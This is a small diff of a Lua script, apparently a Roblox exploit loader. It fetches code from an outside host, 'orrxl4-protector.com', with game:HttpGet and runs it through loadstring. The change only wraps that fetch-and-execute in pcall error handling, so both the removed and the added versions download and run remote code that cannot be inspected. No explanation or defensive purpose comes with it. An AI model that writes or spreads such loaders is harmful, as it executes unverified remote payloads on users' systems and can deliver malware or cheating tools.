@@ -1,1 +1,7 @@
-loadstring(game:HttpGet("https://orrxl4-protector.com/api/raw?id=13awzuhl"))()
+local success, result = pcall(function()
+    return loadstring(game:HttpGet("https://orrxl4-protector.com/api/raw?id=13awzuhl"))
+end)
+
+if success and type(result) == "function" then
+    result()
+end
